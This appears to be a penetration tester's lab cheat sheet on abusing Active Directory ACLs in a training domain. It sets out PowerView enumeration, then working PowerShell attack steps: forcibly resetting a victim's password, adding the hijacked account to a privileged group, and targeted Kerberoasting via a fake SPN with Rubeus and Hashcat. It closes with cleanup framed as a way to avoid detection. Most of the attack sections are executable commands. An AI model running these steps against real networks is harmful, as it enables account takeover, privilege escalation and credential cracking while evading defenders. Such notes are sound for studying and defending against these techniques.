# ACL Enumeration & Abuse
**Concept:** Active Directory permissions (DACLs) often grant low-level users control over high-level objects. 
**Key Rights:**
- **ForceChangePassword:** Reset a user's password without knowing the old one.
- **AddMember:** Add yourself to a privileged group.
- **GenericWrite / GenericAll:** Full control (modify any attribute, e.g., `scriptPath` or `servicePrincipalName`).
- **WriteOwner:** Seize ownership of an object.
## 1. ACL Enumeration (PowerView)
**Goal:** Find "Interesting" ACLs where our current user has control over other objects.
### Basic Discovery
```powershell
# Load PowerView
Import-Module .\PowerView.ps1

# Find ACLs that are "interesting" (non-default) for the current user
Find-InterestingDomainAcl

# Check ACLs associated with a specific user (Resolve SIDs to Names)
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```
### Mapping GUIDs (What does the right mean?)
If you see a raw GUID (e.g., `0029...`), you can look up what permission it represents (e.g., "Reset Password").
```powershell
$guid = "00299570-246d-11d0-a768-00aa006e0529" # Reset Password GUID
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | ?{$_.rightsGuid -eq $guid} | fl Name,DisplayName
```
### Hunting Specific Rights
Check if a specific user (e.g., `damundsen`) has rights over other objects.
```powershell
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```
## 2. Abuse Case 1: ForceChangePassword
**Scenario:** Enumeration reveals you have `User-Force-Change-Password` (or `GenericAll`) over the user `damundsen`. 
**Attack:** You can reset their password to something you know, effectively hijacking the account. 
**Warning:** This is **destructive**. The user will notice they can't log in.
### Execution
```powershell
# 1. Create a credential object for your CURRENT user (wley)
$SecPassword = ConvertTo-SecureString 'CurrentPass123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# 2. Define the NEW password for the Victim
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# 3. Force the Reset
# -Identity: Victim | -Credential: You
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
## 3. Abuse Case 2: AddMember (Group Modification)
**Scenario:** You have hijacked `damundsen`. Enumeration shows `damundsen` has `WriteProperty` (Member) rights over the group "Help Desk Level 1". 
**Attack:** Add yourself (or `damundsen`) to that group to inherit its privileges.
### Execution
```powershell
# 1. Create creds for the hijacked user (damundsen)
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# 2. Add to Group
# Note: 'Help Desk Level 1' might be nested in other groups. Check with Get-DomainGroup.
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# 3. Verify
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
## 4. Abuse Case 3: Targeted Kerberoasting (GenericWrite)
**Scenario:** You have `GenericWrite` or `GenericAll` over the user `adunn`. 
**Attack:** `adunn` is a normal user (not Kerberoastable). We can _make_ them Kerberoastable by setting a fake `ServicePrincipalName` (SPN) on their account. We then request a TGS and crack it.
### Execution
```powershell
# 1. Set a Fake SPN
# This tells AD: "adunn is now a service account"
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# 2. Roast the User (Rubeus)
# We request a ticket for the new SPN.
.\Rubeus.exe kerberoast /user:adunn /nowrap

# 3. Crack the Hash
# (Take the output hash to Hashcat -m 13100)
```
## 5. Cleanup (OPSEC)
**Crucial:** Always revert ACL changes to avoid detection and leave the environment clean.
### Remove the Fake SPN
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
### Remove User from Group
```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

# Verify removal
Get-DomainGroupMember -Identity "Help Desk Level 1" | ? {$_.MemberName -eq 'damundsen'}
```